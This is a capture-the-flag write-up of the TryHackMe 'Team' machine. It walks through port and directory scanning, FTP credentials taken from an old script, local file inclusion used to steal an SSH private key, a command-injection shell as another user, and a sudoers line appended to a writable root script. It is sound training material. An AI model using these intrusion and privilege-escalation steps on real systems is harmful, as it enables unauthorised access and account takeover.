# TryHackMe - Team (Write-Up)

_6 min read · April 12, 2026 · by qs18_

---

## Entry Log

In this mini-blog, I’ll be showing you the walkthrough for [**Team**](https://tryhackme.com/room/teamcw) machine from [**TryHackMe**](https://tryhackme.com/).

- Goal: Obtain User and Root Flag
- Difficulty: Easy
- Machine Author: dalemazza

---

## Scanning for Open Ports

Machine IP: 10.49.133.85.

As usual, I started with an [**Nmap**](https://www.kali.org/tools/nmap/) scan:

```bash
nmap -T4 -p- 10.49.133.85
sudo nmap -sCV -p 21,22,80 10.49.133.85
```

![Nmap Output](./img/thm-team/Nmap-output.png)

From the scan result, I noticed that:

- FTP (port 21) is open.
- SSH (port 22) is open.
- HTTP (port 80) is open.

As usual, I browsed the site first. However, it was just a default Apache2 Ubuntu page.

After inspecting the source code, I saw this in the title:

```output
If you see this add 'team.thm' to your hosts!
```

So I appended this in my `/etc/hosts`:

```bash
10.49.133.85 team.thm
```

![Team: Website](./img/thm-team/web.png)

After accessing `team.thm`, I didn't find anything interesting in the page or source code.

---

## Futher Enumeration on the Website

Next, I used [**Gobuster**](https://www.kali.org/tools/gobuster/) to enumerate directories.

```bash
gobuster dir -u http://team.thm/ -w /usr/share/wordlists/dirb/big.txt -t 100
```

![Gobuster Output](./img/thm-team/gobuster-output.png)

I accessed the `robots.txt` and saw this:

```output
dale
```

This could be a username or password.

Then I further enumerated the discovered directories.

For `/assets`:

```output
css                  (Status: 301) [Size: 309]
fonts                (Status: 301) [Size: 311]
js                   (Status: 301) [Size: 308]
```

For `/scripts`:

```output
script.txt           (Status: 200) [Size: 597]
```

I accessed `team.thm/scripts/script.txt`:

![script.txt](./img/thm-team/script-txt.png)

Nothing obvious stood out at first.

However, the last line caught my attention:

```output
# Note to self had to change the extension of the old "script" in this folder, as it has creds in
```

So I tried changing the extension to `script.old`, and a file was downloaded.

![script.old](./img/thm-team/script-old.png)

I successfully retrieved FTP credentials.

---

## FTP Enumeration

I logged into FTP:

```bash
ftp 10.48.131.251
ftpuser
T3@m$h@r3
```

Inside, I found `workshare` directory:

```bash
cd workshare
ls
```

```output
-rwxr-xr-x    1 1002     1002          269 Jan 15  2021 New_site.txt
```

I downloaded the file:

```bash
get New_site.txt
```

![New_site.txt](./img/thm-team/new-site-txt.png)

It's referencing to a subdomain, so I added `dev.team.thm` in the `/etc/hosts` file.

---

## Local File Inclusion

After accessing `dev.team.thm`, I didn’t find anything interesting initially.

However, clicking a link brought me to a page that looked vulnerable to LFI.

I tested it and confirmed that LFI works.

![LFI](./img/thm-team/lfi.png)

I saw user 'Dale' and 'Gyles' here.

Then I started [**Burpsuite**](https://www.kali.org/tools/burpsuite/), sent the intercepted traffic to Intruder, added a payload placeholder after `page=`, and used `seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt` as the LFI wordlist.

![Burp](./img/thm-team/burp.png)

After a while, I discovered the `id_rsa` for user Dale.

![dale id_rsa](./img/thm-team/id-rsa.png)

---

## Gaining Access via SSH

I logged in via SSH:

```bash
chmod 600 id_rsa
ssh -i id_rsa dale@10.49.174.204
```

And I found the **user flag**.

![User Flag](./img/thm-team/user-flag.png)

---

## Privilege Escalation pt. 1

I checked for allowed sudo for Dale:

```bash
sudo -l
```

```output
User dale may run the following commands on ip-10-49-174-204:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

I read the script:

```output
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```

The script takes user input and executes it using `$error`.

This is vulnerable to command injection because whatever is entered into `error`, it will be executed as a command.

So I abused this vulnerability:

```bash
sudo -u gyles /home/gyles/admin_checks
```

When prompted for entering the 'date', I entered:

```bash
/bin/bash
```

Then I checked the current user ID:

```output
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),108(lxd),1003(editors),1004(admin)
```

I successfully swtiched to Gyles.

---

## Privilege Escalation pt. 2

Then I made it interactive TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

I checked `.bash_history` and found a reference to `main_backup.sh`.

I located the file:

```bash
find / -name 'main_backup.sh' 2>/dev/null
```

```output
/usr/local/bin/main_backup.sh
```

I checked the permissions:

```bash
ls -al /usr/local/bin/main_backup.sh
```

```output
-rwxrwxr-x 1 root admin 65 Jan 17  2021 /usr/local/bin/main_backup.sh
```

The script is writable by the `admin` group, and user Gyles belongs to this group.

So I added this line:

```bash
echo "gyles ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```

Then I ran the script:

```bash
./main_backups.sh
```

After that, I checked for allowed sudo for Gyles:

```output
User gyles may run the following commands on ip-10-49-174-204:
    (ALL) NOPASSWD: ALL
```

I then switched to root, navigated to `/root` and retrieved the **root flag**.

```bash
sudo su
cd /root
cat root.txt
```

![Root Flag](./img/thm-team/root-flag.png)

Bomba! Settleee.

---

## Session Terminated

From this machine, I learned how to:

- abuse LFI to retrieve sensitive files
- exploit command injection in scripts executed via sudo

Thank you for reading and see you next time!
